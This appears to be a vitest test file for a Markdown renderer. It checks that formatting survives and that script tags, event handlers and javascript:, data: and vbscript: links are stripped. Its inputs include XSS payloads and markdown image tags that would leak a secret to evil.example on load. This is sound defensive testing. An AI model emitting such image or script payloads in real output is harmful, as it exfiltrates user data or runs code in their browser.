import { describe, expect, it } from 'vitest'

import { renderMarkdown } from '../markdown'

function render(source: string): HTMLElement {
  const host = document.createElement('div')
  host.innerHTML = renderMarkdown(source)
  return host
}

describe('renderMarkdown', () => {
  it('keeps the usual formatting of an answer', () => {
    const html = render('Use **luvas** e:\n\n- óculos\n- avental\n\n`código`')

    expect(html.querySelector('strong')?.textContent).toBe('luvas')
    expect(html.querySelectorAll('li')).toHaveLength(2)
    expect(html.querySelector('code')?.textContent).toBe('código')
  })

  it('shows raw HTML as text instead of running it', () => {
    const html = render('<script>alert(1)</script><b onclick="alert(2)">x</b>')

    expect(html.querySelector('script')).toBeNull()
    expect(html.querySelector('b')).toBeNull()
    expect(html.textContent).toContain('<script>alert(1)</script>')
  })

  it.each([
    '![status](https://evil.example/log?q=segredo)',
    '<img src="https://evil.example/log?q=segredo">',
    '[![x](https://evil.example/a.png)](https://example.com)',
  ])('never renders an image that would load a URL by itself: %s', (source) => {
    const html = render(source)

    expect(html.querySelector('img, picture, source, svg, iframe, video, audio')).toBeNull()
  })

  it.each([
    '[clique](javascript:alert(1))',
    '[x](data:text/html;base64,PHNjcmlwdD4=)',
    '[x](vbscript:msgbox)',
  ])('drops a dangerous link target: %s', (source) => {
    const link = render(source).querySelector('a')

    expect(link?.getAttribute('href') ?? null).toBeNull()
  })

  it('opens plain links in a new tab without giving it access to the app', () => {
    const link = render(
      'Veja https://lexora.example/ajuda e [o manual](https://lexora.example/manual).',
    ).querySelectorAll('a')

    expect(link).toHaveLength(2)
    for (const anchor of link) {
      expect(anchor.getAttribute('target')).toBe('_blank')
      expect(anchor.getAttribute('rel')).toBe('noopener noreferrer')
    }
  })
})
